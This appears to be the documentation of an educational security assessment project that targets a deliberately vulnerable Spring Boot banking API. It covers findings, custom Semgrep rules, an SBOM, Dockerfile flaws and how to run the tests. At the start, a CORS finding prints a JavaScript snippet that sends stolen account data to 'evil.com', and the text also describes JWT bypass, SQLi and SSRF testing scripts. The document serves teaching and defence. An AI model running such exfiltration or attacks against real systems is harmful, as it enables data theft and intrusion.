**Attack:** A malicious page at `http://evil.com` runs:
`javascript
fetch('http://localhost:8080/api/accounts', {
    headers: {Authorization: 'Bearer <stolen_token>'}
})
.then(r => r.json())
.then(data => fetch('http://evil.com/collect?data=' + JSON.stringify(data)));
`
The full account list is exfiltrated to the attacker's server.

**Fix:**
`java
configuration.setAllowedOrigins(List.of("https://app.finsecure.com", "https://admin.finsecure.com"));
// Never use * for financial APIs
`
**Remediation effort:** Low

---

### FIND-012 — Verbose Stack Trace Disclosure in Error Responses

**Severity:** LOW | **CVSS:** 5.3 | **CWE:** CWE-209 | **OWASP:** A05:2021 Security Misconfiguration

**Location:** `application.properties` — `server.error.include-stacktrace=always`

**What leaks:** Any unhandled exception returns the full Java stack trace in the HTTP response body, including:
- Spring Boot version (2.6.3)
- JDK version (17.0.18)
- Database type (H2) and SQL dialect
- Hibernate version
- Internal class names and line numbers
- SQL query structure (when SQL errors occur)

**Evidence:** `GET /api/accounts/99999` returns:
`json
{
  "error": "org.springframework.dao.EmptyResultDataAccessException",
  "stackTrace": "at org.springframework.jdbc.core.JdbcTemplate...",
  "javaVersion": "17.0.18"
}
`

This single finding gives an attacker the exact library versions to target with CVE exploits.

**Fix:**
`properties
# application.properties (production):
server.error.include-stacktrace=never
server.error.include-message=never
server.error.include-exception=false
`
Return only generic error IDs in responses: `{"errorId":"ERR-2024-001","message":"An internal error occurred"}`.

**Remediation effort:** Low

---
## Custom Semgrep Rules — What They Catch and How

Semgrep is a code analysis tool that matches patterns in source code. These rules were written specifically for the vulnerability classes expected in Spring Boot applications. There are four rule files plus a global config.

---

### `java-deser.yaml` — Java Deserialization Detection

**What it catches:** Any use of `ObjectInputStream.readObject()` — the standard Java way to deserialise objects, and the source of many Remote Code Execution vulnerabilities.

**Three rules inside:**

**Rule 1: `java-unsafe-deserialization`** (CRITICAL, CVSS 9.8)
Matches the exact pattern of creating an `ObjectInputStream` and calling `readObject()` on it, without an `ObjectInputFilter` installed first.

`yaml
patterns:
  - pattern: |
      ObjectInputStream  = new ObjectInputStream(...);
      ...
      .readObject();
  - pattern: (new ObjectInputStream(...)).readObject();
`

**Rule 2: `java-unsafe-deserialization-any-stream`** (WARNING)
Broader pattern — any variable with `.readObject()` called on it, even if the `ObjectInputStream` was created elsewhere (e.g. passed as a method argument).
`yaml
pattern: .readObject()
`

**Rule 3: `java-classloader-reflection-deser`** (WARNING)
Catches `Class.forName()` — using user-controlled input to load a class by name, which is a prerequisite for gadget chain attacks.
`yaml
pattern: Class.forName()
`

**Why this matters:** With Commons Collections 3.1 on the classpath (FIND-008), a single `readObject()` call on attacker-controlled data means Remote Code Execution. This rule catches the call site in static analysis, before the application is deployed.

---

### `jwt-misconfig.yaml` — JWT Misconfiguration Detection

**What it catches:** Five different JWT security failures — all of which exist in FinSecure.

**Rule 1: `jwt-alg-none-bypass`** (CRITICAL, CVSS 9.1)
`yaml
pattern: .parseClaimsJwt(...)
# Any call to parseClaimsJwt() is the unsigned parser — always a finding
`

**Rule 2: `jwt-missing-signing-key`** (CRITICAL, CVSS 9.1)
`yaml
patterns:
  - pattern: Jwts.parser().parseClaimsJwt(...)
  - pattern: Jwts.parser().parseClaimsJws(...)
pattern-not: Jwts.parser().setSigningKey(...).parseClaimsJws(...)
# Matches parsers without setSigningKey(), excludes the safe pattern
`

**Rule 3: `jwt-hardcoded-secret`** (HIGH, CVSS 7.5)
`yaml
patterns:
  - pattern: .signWith(, "")
  - pattern: |
      String  = "...";
      ...
      .signWith(, );
# Catches string literals passed to signWith(), both direct and via variable
`

**Rule 4: `jwt-no-expiry`** (MEDIUM, CVSS 6.5)
`yaml
patterns:
  - pattern: Jwts.builder(). ... .compact()
pattern-not: Jwts.builder(). ... .setExpiration(...). ... .compact()
# JWT builder chain that never calls setExpiration() before compact()
`

**Rule 5: `jwt-weak-algorithm`** (MEDIUM, CVSS 5.3)
`yaml
pattern: .signWith(SignatureAlgorithm.HS256, ...)
# Flags symmetric HS256 — unsuitable for multi-service architectures
`

---

### `sqli-patterns.yaml` — SQL Injection Pattern Detection

**What it catches:** Five SQL injection patterns via string concatenation.

**Rule 1: `sqli-string-concat-jpa-createquery`** (CRITICAL, CVSS 9.8)
`yaml
patterns:
  - pattern: .createQuery("..." + ...)
  - pattern: .createNativeQuery("..." + ...)
# Concatenation inside JPA query methods
`

**Rule 2: `sqli-string-concat-jdbc-statement`** (CRITICAL, CVSS 9.8)
`yaml
patterns:
  - pattern: .execute("..." + ...)
  - pattern: .executeQuery("..." + ...)
  - pattern: .createStatement().execute("..." + ...)
# Concatenation inside raw JDBC statement execution
`

**Rule 3: `sqli-string-concat-jdbctemplate`** (CRITICAL, CVSS 9.8)
`yaml
patterns:
  - pattern: .queryForList("..." + ...)
  - pattern: |
      String  = "..." + ;
      ...
      .queryForList()
# This exact pattern is what catches AccountController.java line 144
`

**Rule 4: `sqli-string-format-sql`** (HIGH, CVSS 8.8)
`yaml
patterns:
  - pattern: |
      String  = String.format("SELECT ...", ...);
      ...
      .execute()
# String.format() is equivalent to concatenation for injection purposes
`

**Rule 5: `sqli-raw-string-variable-query`** (WARNING, CVSS 9.8)
`yaml
pattern: |
  String  = "SELECT " + ... +  + ...;
# Broader pattern -- catches query construction before the execution call
`

---

### `hardcoded-creds.yaml` — Hardcoded Credential Detection

**What it catches:** Credentials, API keys, passwords, and tokens written directly in source code.

- Variables named `password`, `secret`, `apiKey`, `token` assigned string literals
- Annotations like `@Value("hardcoded-secret")` instead of `@Value("")`
- HTTP `Authorization: Basic` headers constructed with embedded credentials
- Fields named `SECRET_KEY`, `PASSWORD`, `CREDENTIAL` assigned string literals

This rule catches `SECRET_KEY = "secret123"` in both `JwtFilter.java` and `AuthController.java` — FIND-004 above.

---

### Global `config/semgrep_rules.yaml`

An additional, broader rule set covering Java security patterns beyond the Spring-specific rules:

| Rule | CVE Class | CVSS |
|------|-----------|------|
| SQL injection via JDBC concatenation | CWE-89 | 9.8 |
| Insecure deserialization (ObjectInputStream) | CWE-502 | 9.8 |
| XXE via DocumentBuilderFactory without DTD disabled | CWE-611 | 8.6 |
| Hardcoded credentials in variables | CWE-798 | 7.5 |
| LDAP injection via search filter concatenation | CWE-90 | 8.1 |
| Insecure random (java.util.Random instead of SecureRandom) | CWE-338 | 5.3 |
| Weak crypto hash functions (MD5, SHA-1) | CWE-328 | 5.9 |

---

## The SBOM — Your Software Ingredient List

**File:** `findings/sbom.cdx.json`
**Format:** CycloneDX 1.4 JSON
**Generated by:** Syft (Anchore)

An SBOM (Software Bill of Materials) is an ingredient list for software — it records every library the application uses, including transitive dependencies (libraries that your libraries depend on). The US Executive Order 14028 on Cybersecurity (2021) mandates SBOMs for software sold to the US government.

The FinSecure SBOM lists 15 components:

| Library | Version | CVE Status |
|---------|---------|-----------|
| jackson-databind | 2.13.2 | CVE-2022-42003, CVE-2022-42004 |
| commons-collections | 3.1 | CVE-2015-6420 |
| spring-webmvc | 5.3.15 | CVE-2022-22965 (Spring4Shell) |
| spring-web | 5.3.15 | CVE-2022-22965 |
| spring-security-core | 5.6.3 | No known CVEs |
| jjwt | 0.9.1 | No known CVEs |
| h2 | 2.1.210 | No known CVEs |
| hibernate-core | 5.6.5 | No known CVEs |
| tomcat-embed-core | 9.0.57 | No known CVEs |
| logback-classic | 1.2.10 | No known CVEs |
| slf4j-api | 1.7.36 | No known CVEs |
| jackson-core | 2.13.2 | No known CVEs |
| spring-boot | 2.6.3 | No known CVEs |
| spring-context | 5.3.15 | No known CVEs |
| spring-data-jpa | 2.6.1 | No known CVEs |

Each component is identified by its **PURL (Package URL)** — a standardised identifier like `pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.13.2` that uniquely identifies the exact version in a specific package ecosystem. PURLs are used by vulnerability databases and CI/CD security scanners to match components against CVE databases.

**Why Log4Shell made SBOMs essential:** After CVE-2021-44228 (Log4Shell) was disclosed, organisations scrambled to find out if they used Log4j anywhere. Many discovered it was a transitive dependency in frameworks they did not know used it — often as a dependency of a dependency. An SBOM would have made this a 30-second query instead of a multi-day audit. The `sbom_generator.py` script ensures a current SBOM exists for exactly this scenario.

---

## The Docker Setup and Its Security Issues

**File:** `target-app/Dockerfile`

The Dockerfile builds and runs the FinSecure application. It was designed with realistic DevOps mistakes — the kind that appear in real production environments.

**VULN-1: Running as root (no USER directive)**

By default, Docker containers run as root (UID 0). The Dockerfile has no `USER` directive, so the JVM runs with full root privileges.

If an attacker achieves code execution in the container (via Spring4Shell or the Commons Collections gadget chain — both present in this app), they are root inside the container. With certain Docker socket misconfiguratons (a common production mistake), this enables container escape to the host.

Fix:
`dockerfile
RUN addgroup --system finsecure && adduser --system --ingroup finsecure finsecure
USER finsecure
ENTRYPOINT ["java", "-jar", "target/finsecure-api-1.0.0.jar"]
`

**VULN-2: JDWP Debug Port 5005 Exposed**

The ENTRYPOINT starts the JVM with:
`dockerfile
ENTRYPOINT ["java",
  "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005",
  "-jar", "target/finsecure-api-1.0.0.jar"]
EXPOSE 5005
`

JDWP (Java Debug Wire Protocol) allows a remote debugger (IntelliJ, Eclipse, jdb) to attach to the running JVM. With `address=*:5005`, any machine on the network can connect — not just localhost.

An attacker who reaches port 5005 can:
- Inspect all live Java objects in memory (session tokens, decrypted secrets, database results)
- Step through code execution
- Evaluate arbitrary Java expressions in the running JVM — which is effectively arbitrary code execution

Fix: Remove the debug agent entirely from any image that might be deployed outside a developer's laptop. Use a separate debug-enabled image for local development only.

**VULN-3: Full JDK Base Image**

`FROM eclipse-temurin:17-jdk` ships with the full Java Development Kit including `javac`, `jmap`, `jstack`, `jconsole`, and other profiling tools. This dramatically increases the attack surface — an attacker who gets a shell in the container has access to Java's own introspection and compilation tools.

Fix: Use `eclipse-temurin:17-jre` (runtime only) or `gcr.io/distroless/java17-debian11` (no shell, no package manager, close to impossible to use interactively even after compromise).

---
## Project File Map — Every File Explained

The project is split into five logical areas. Here is every file, what it does, and why it exists.

---

### Root — Project Entry Points

| File | What it does |
|------|-------------|
| `orchestrator.py` | **Master runner** — executes all four phases in sequence: SAST → SCA → DAST → Report |
| `requirements.txt` | Python dependencies: `requests`, `rich`, `jinja2`, `pyyaml` |
| `requirements-dev.txt` | Dev extras: `pytest`, `coverage`, `black` |
| `setup.py` / `pyproject.toml` | Python package metadata (makes `java_security_assessment` importable) |
| `pytest.ini` / `.coveragerc` | Test runner and coverage configuration |
| `.env.example` | Sample environment variable file (`JWT_SECRET`, `SONAR_TOKEN`, `NVD_API_KEY`) |
| `Makefile` | Shortcut commands: `make sast`, `make dast`, `make report`, `make all` |
| `LICENSE` | MIT License |

---

### `target-app/` — The Vulnerable Spring Boot Application

This is the target being assessed. It is a fully functional financial REST API with intentional security vulnerabilities baked into every layer.

**Build files**

| File | What it does |
|------|-------------|
| `pom.xml` | Maven build file — declares intentionally outdated, vulnerable dependencies |
| `Dockerfile` | Container config with 4 intentional security mistakes (root user, JDWP exposed, JDK image) |
| `mvnw` / `mvnw.cmd` | Maven wrapper — runs Maven without needing it installed system-wide |
| `finsecure.log` | Application log file generated during test runs |
| `src/main/resources/application.properties` | Config file — H2 console open, Actuator exposed, full stack traces enabled |

**Controllers (`src/main/java/com/finsecure/controller/`)**

| File | Vulnerabilities inside |
|------|----------------------|
| `AccountController.java` | Second-order SQLi (line 144) · Horizontal IDOR (line 64) · Mass Assignment (line 42) |
| `AuthController.java` | Hardcoded JWT secret · No token expiry · Plain-text password comparison |
| `UtilController.java` | SSRF via `/api/fetch` · Info disclosure via `/api/health` |

**Security layer (`src/main/java/com/finsecure/security/`)**

| File | Vulnerabilities inside |
|------|----------------------|
| `JwtFilter.java` | `alg:none` bypass (unsigned parser) · Hardcoded `SECRET_KEY = "secret123"` |
| `SecurityConfig.java` | CSRF disabled · Wildcard CORS (`allowedOrigins("*")`) · `NoOpPasswordEncoder` · H2 console public |

**Data layer (`src/main/java/com/finsecure/`)**

| File | What it does |
|------|-------------|
| `FinSecureApplication.java` | Spring Boot entry point (`@SpringBootApplication`) |
| `DataSeeder.java` | Seeds test accounts on startup: alice, bob, charlie, admin |
| `model/Account.java` | Account entity — `isAdmin` is mass-assignable; `profileNote` feeds the SQLi |
| `model/User.java` | User entity — password stored as plain text |
| `repository/AccountRepository.java` | JPA repository for Account entities |
| `repository/UserRepository.java` | JPA repository for User entities |

---

### `assessment/` — The Security Testing Toolkit

This is the assessment engine — the scripts that actually run the tests.

**SAST (Static Analysis) — `assessment/sast/`**

| File | What it does |
|------|-------------|
| `run_sast.py` | Runs Semgrep with all custom rules, enriches findings with CVSS scores, saves to JSON |
| `semgrep_rules/java-deser.yaml` | 3 rules: detects unsafe `ObjectInputStream` deserialization patterns |
| `semgrep_rules/jwt-misconfig.yaml` | 5 rules: detects `alg:none` bypass, hardcoded secret, missing expiry, weak algorithm |
| `semgrep_rules/sqli-patterns.yaml` | 5 rules: detects SQL string concatenation in JDBC, JPA, and `JdbcTemplate` |
| `semgrep_rules/hardcoded-creds.yaml` | Detects hardcoded passwords, API keys, and secrets in source code |

**SCA (Dependency Scanning) — `assessment/sca/`**

| File | What it does |
|------|-------------|
| `dependency_check.py` | Runs OWASP Dependency-Check against `pom.xml`, parses XML output, extracts CVEs |
| `cve_enricher.py` | Calls the NVD API to fetch full descriptions and CVSS vectors for each CVE |
| `sbom_generator.py` | Runs Syft to generate a CycloneDX 1.4 SBOM, then flags vulnerable components |

**DAST (Live Attack Testing) — `assessment/dast/`**

| File | Tests it runs |
|------|--------------|
| `auth_tester.py` | JWT `alg:none` bypass · HMAC secret brute-force (25-entry wordlist) · Auth enforcement |
| `sqli_tester.py` | Time-based blind SQLi · Second-order SQLi (2-step) · UNION-based data extraction |
| `access_control.py` | Horizontal IDOR loop (IDs 1–50) · Vertical privilege escalation · Mass assignment |
| `ssrf_tester.py` | Internal SSRF · Cloud metadata (AWS/GCP/Azure) · Blind SSRF via response timing |

---

### `config/` , `findings/` , and `report/`

**`config/` — Rule and tool configuration**

| File | What it does |
|------|-------------|
| `semgrep_rules.yaml` | Broader Java SAST rules: XXE, LDAP injection, weak crypto, insecure random |
| `config.yaml.example` | Tool paths template: Dependency-Check binary path, SonarQube URL, NVD API key |

**`findings/` — All assessment output lands here**

| File | What it contains |
|------|----------------|
| `all_findings.json` | Merged output from all phases — 22 total entries (SAST + SCA + DAST) |
| `sample_findings.json` | Curated 12-finding set with full detail — used as the report's data source |
| `sast_results.json` | Raw Semgrep JSON output (6 SAST findings with file paths and line numbers) |
| `enriched_cves.json` | NVD-enriched CVE data — 4 CVEs with full descriptions, vectors, and references |

**`report/` — Report generation**

| File | What it does |
|------|-------------|
| `report_generator.py` | Reads the findings JSON, renders it through the HTML template, writes the report |
| `templates/report_template.html` | HTML report template with styling, severity colour coding, and sortable tables |
| `output/security_report.html` | **The final deliverable** — open this in any browser to read the full assessment |

---

### `java_security_assessment/` — Reusable Python Package

An importable Python package that wraps all the assessment logic into clean, reusable modules. This is what separates the project from a collection of scripts — it has a proper architecture.

**Core modules**

| File | What it does |
|------|-------------|
| `assessment_orchestrator.py` | Programmatic pipeline runner — call from Python code, not just CLI |
| `config_manager.py` | Loads tool paths and API keys from the YAML config file |
| `finding_manager.py` | Deduplicates findings and normalises severity ratings across tools |
| `cli.py` | Click-based command-line interface — the `java-security-assess` command |

**`sast/` — Static analysis modules**

| File | What it does |
|------|-------------|
| `semgrep_analyzer.py` | Semgrep integration module — runs rules, parses JSON, maps to findings |
| `sonarqube_analyzer.py` | SonarQube API client — pulls issues, quality gates, and code metrics |
| `dependency_analyzer.py` | OWASP Dependency-Check integration — parses reports and extracts CVEs |

**`api_testing/` — Attack test libraries**

| File | Attack class |
|------|-------------|
| `sql_injection_tester.py` | Full SQLi test suite (blind, error-based, second-order, UNION) |
| `ssrf_tester.py` | SSRF test library (internal, cloud metadata, blind timing) |
| `xxe_tester.py` | XML External Entity injection tester |
| `deserialization_tester.py` | Java deserialization payload sender |
| `ldap_tester.py` | LDAP injection tester |
| `xpath_tester.py` | XPath injection tester |
| `response_analyzer.py` | Response classifier — detects error messages and data leaks in responses |

**`auth_testing/` — Authentication test libraries**

| File | What it does |
|------|-------------|
| `jwt_auditor.py` | JWT decode + algorithm check + expiry verification + HMAC brute-force |
| `oauth_analyzer.py` | OAuth 2.0 flow analyser (PKCE, state parameter, redirect URI) |
| `auth_tester.py` | General authentication test harness |
| `permission_checker.py` | RBAC verification — checks role-based access controls hold |

**Other directories**

| Directory | What it contains |
|-----------|----------------|
| `spring_testing/` | Spring Boot specific tests — Actuator endpoints, H2 console, bean inspection |
| `enumeration/` | Endpoint discovery and API fingerprinting |
| `evidence/` | Screenshot and HTTP evidence collection utilities |
| `reporting/` | Report generation library — converts findings into HTML output |
| `utils/` | HTTP client, retry logic, logging helpers |

---

### Supporting Directories

**`tests/`**

| Directory | What it contains |
|-----------|----------------|
| `unit/` | Unit tests for individual module functions (no running API needed) |
| `integration/` | Integration tests that require the FinSecure API to be running |
| `fixtures/` | Test data and mock API responses |

**`examples/`**

| Directory | What it contains |
|-----------|----------------|
| `configurations/` | Example config files for different deployment environments |
| `sample_reports/` | Pre-generated output reports for reference |
| `scan_results/` | Example scan output JSON files |

**`docs/`**

| File | What it covers |
|------|---------------|
| `API.md` | Full API endpoint documentation |
| `ARCHITECTURE.md` | System architecture overview |
| `CONTRIBUTING.md` | How to contribute to the project |
| `FINDINGS_GUIDE.md` | How to interpret and act on assessment findings |
| `QUICKSTART.md` | Getting started in 5 minutes |
| `SEMGREP_RULES.md` | Semgrep rules documentation — how to write and extend them |
| `USAGE.md` | Detailed usage guide for all modules |

---
## How This Compares to Commercial and Free Tools

Here is an honest, direct comparison between this project's approach and the tools available on the market — both free and paid.

---

### vs. Veracode (Commercial — $40,000+/year for enterprise)

**What Veracode does:** Cloud-based SAST and SCA. You upload your JAR file, it scans in the cloud, and you get a dashboard with findings.

**Where this project wins:**

- **Transparency:** Veracode is a black box — you get results but cannot see the rules behind them. This project's rules are readable YAML files you can read, modify, and understand completely.
- **Custom patterns:** Veracode has built-in rules but limited ability to write custom patterns for your specific architecture. This project has custom Semgrep rules for JWT algorithm confusion and second-order SQLi patterns that generic tools miss.
- **Cost:** Free and open source. Veracode requires an enterprise contract.
- **Reproducibility:** Every step is a Python script you can read, version-control, and run locally. Veracode's pipeline is vendor-controlled and opaque.
- **DAST included:** Veracode Static Analysis is SAST only. This project adds live dynamic attack testing on the running application.

**Where Veracode wins:** Massively broader rule set, compliance reporting (SOC2, PCI-DSS, HIPAA, ISO27001), SLA guarantees, polished web dashboard, professional support, false-positive management.

---

### vs. SonarQube Community Edition (Free, open source, self-hosted)

**What SonarQube does:** SAST for multiple languages, code quality analysis, security hotspot detection. Runs as a server and integrates with CI/CD pipelines.

**Where this project wins:**

- **DAST included:** SonarQube is SAST only. This project adds live dynamic testing that actually confirms the vulnerability is exploitable at runtime — not just a code pattern.
- **SCA integrated:** SonarQube Community does not include dependency vulnerability scanning. This project includes OWASP Dependency-Check and CycloneDX SBOM generation.
- **Report format:** SonarQube shows results in a web dashboard. This project generates a standalone HTML report with full CVSS scores, PoC steps, and business impact — the format a client receives after a penetration test.
- **Custom rules are YAML:** SonarQube custom rules require writing Java plugins. Semgrep rules are simple YAML files anyone can write and test in 10 minutes.

**Where SonarQube wins:** Continuous integration (runs on every commit), tech debt tracking, code duplication detection, polished UI, broader language support, persistent finding history.

---

### vs. OWASP ZAP (Free, open source)

**What ZAP does:** Full DAST proxy — intercepts browser traffic, crawls the application, and runs automated attack modules. Free and widely used in security testing.

**Where this project wins:**

- **Second-order SQLi detection:** ZAP cannot detect second-order SQL injection because it does not correlate state across multiple requests. When the payload is stored in request A and triggered in request B, ZAP only sees two independent requests and misses the injection. This project's `sqli_tester.py` runs the two-step attack explicitly, tracking the payload from storage to trigger.
- **JWT testing:** ZAP has basic JWT scanning add-ons. This project has dedicated JWT auditing: alg:none bypass construction, HMAC brute-force with wordlists, expiry verification, algorithm strength checks.
- **SAST + SCA integration:** ZAP is DAST only. This project runs all three assessment methods and combines the results into a single report.
- **Scripted and repeatable:** ZAP interactive testing depends on manual tester actions. This project's tests are version-controlled scripts that produce the same results every run, making them suitable for CI/CD pipelines.

**Where ZAP wins:** Full spider/crawler that discovers endpoints automatically (this project tests known endpoints only), passive scanning of all traffic, hundreds of built-in attack modules, Burp Suite-style proxy interception for manual testing, active community and plugin ecosystem.

---

### vs. Snyk (Free tier available, team plans paid)

**What Snyk does:** SCA scanning for dependency vulnerabilities across pom.xml, package.json, requirements.txt, etc. Popular developer tool with IDE integration.

**Where this project wins:**

- **End-to-end:** Snyk's core product is SCA only. This project combines SAST + SCA + DAST + reporting in one automated pipeline.
- **Exploitability context:** Snyk tells you `jackson-databind 2.13.2` has CVE-2022-42003. This project adds: here is the exact HTTP request that triggers the DoS, here is what the attacker gains, here is the specific code change to fix it. That additional context is what turns a vulnerability report into an actionable finding.
- **SBOM:** Both produce SBOMs. This project uses CycloneDX 1.4 format generated by Syft, with cross-referencing against the known vulnerable dependency list.

**Where Snyk wins:** Real-time IDE integration (flags vulnerable libraries as you type the import), automatic pull request creation for dependency upgrades, very fast CVE database updates, Snyk Code (their SAST product) has competitive false-positive rates, large ecosystem of integrations.

---

### vs. Burp Suite Professional (Paid — $449/year per user)

**What Burp Suite Pro does:** The industry standard manual penetration testing proxy and scanner. Professional pentesters use it daily for intercepting, modifying, and replaying HTTP requests.

**Where this project wins:**

- **Reproducibility:** Burp Suite testing is largely interactive — results depend on the tester's skill and cannot be reproduced without manual replay. This project's DAST tests are scripted Python that produce the same output every run. This is essential for regression testing (verifying that a vulnerability is actually fixed after remediation).
- **Second-order SQLi scripted end-to-end:** Testing second-order SQLi in Burp requires manually tracking state — store the payload, remember its effect, run the trigger, observe the difference. This project automates that correlation.
- **Open source:** Every test's logic is readable Python. You can see exactly what each test does, understand why it works, modify it, and extend it to cover new attack patterns.
- **Free:** Burp Suite Pro costs $449/year. This project costs nothing.

**Where Burp Suite Pro wins:** Interactive testing for complex multi-step authentication flows, session handling macros, fuzzing with Intruder, professional-grade scanner with decades of accumulated rules, macro recording, real-time proxy interception for any application (not just REST APIs), extensions ecosystem (CSRF scanner, Autorize, JSON Web Tokens plugin). For any real penetration test, Burp Suite Pro is still the essential tool — this project automates the repeatable portions.

---

### The Honest Bottom Line

This project does not replace any of these tools. It demonstrates something different: a **complete, integrated, version-controlled security assessment pipeline** that:

1. Runs automatically from a single command
2. Covers all three assessment methods (SAST, SCA, DAST)
3. Uses custom Semgrep rules that catch patterns generic tools miss (second-order SQLi, JWT algorithm confusion)
4. Generates a CycloneDX SBOM in the format required by enterprise and government security frameworks
5. Produces a professional-grade HTML report with CVSS v3.1 scores, PoC steps, and business impact — not just a list of findings

For a financial institution, this pipeline would run on every pull request (SAST + SCA in CI) and every deployment to staging (DAST against the running app), with the HTML report delivered to developers alongside the code review. That is what "consistent, repeatable security assessment methodology" means in practice.

---

## How to Run Everything

### Prerequisites

- Python 3.11+
- Java 17 + Maven (to build and run the target app)
- Optional: `pip install semgrep` (falls back to demo data if not installed)
- Optional: OWASP Dependency-Check CLI (falls back to demo CVEs)
- Optional: Syft (falls back to demo SBOM)

### Install Python dependencies

`ash
pip install -r requirements.txt
`

### Run the full pipeline in demo mode (no tools required)

`ash
python orchestrator.py --demo --skip-dast
`

Uses pre-generated sample data for SAST and SCA. Skips DAST since no server is running.

### Build and start the target application

`ash
cd target-app
./mvnw spring-boot:run
`

Or build the JAR first:
`ash
./mvnw package -DskipTests
java -jar target/finsecure-api-1.0.0.jar
`

The API starts at `http://localhost:8080`.

Test accounts seeded automatically on startup:

| Username | Password | Role | Account ID | Balance |
|----------|----------|------|------------|---------|
| alice | alice123 | ROLE_USER | 1 | $45,000 |
| bob | bob123 | ROLE_USER | 2 | $78,250 |
| charlie | charlie123 | ROLE_USER | 3 | $12,100 |
| admin | admin123 | ROLE_ADMIN | 4 | $9,999,999 |

H2 database console (no auth): `http://localhost:8080/h2-console`
Spring Actuator (exposes all env vars): `http://localhost:8080/actuator/env`

### Run the full pipeline (live mode — API must be running)

`ash
python orchestrator.py --target http://localhost:8080 --source target-app/src
`

### Run individual phases

`ash
# SAST only (Semgrep)
python assessment/sast/run_sast.py --source target-app/src
python assessment/sast/run_sast.py --demo  # no Semgrep needed

# SCA only (Dependency-Check + SBOM)
python assessment/sca/dependency_check.py --demo
python assessment/sca/sbom_generator.py --demo
python assessment/sca/cve_enricher.py --demo

# DAST - JWT/auth testing
python assessment/dast/auth_tester.py --target http://localhost:8080

# DAST - SQL injection
python assessment/dast/sqli_tester.py --target http://localhost:8080

# DAST - Access control (IDOR + mass assignment)
python assessment/dast/access_control.py --target http://localhost:8080

# DAST - SSRF
python assessment/dast/ssrf_tester.py --target http://localhost:8080

# Generate HTML report
python report/report_generator.py \
    --findings findings/sample_findings.json \
    --output report/output/security_report.html
`

### View the security report

Open `report/output/security_report.html` in any browser. It contains the complete 12-finding assessment with full technical detail, proof-of-concept steps, CVSS scores, and remediation guidance.

---

> **Warning:** The FinSecure API contains intentional security vulnerabilities for educational purposes. Never deploy it on a public server or any environment connected to real data. It is designed to be exploited — in a controlled lab environment only.
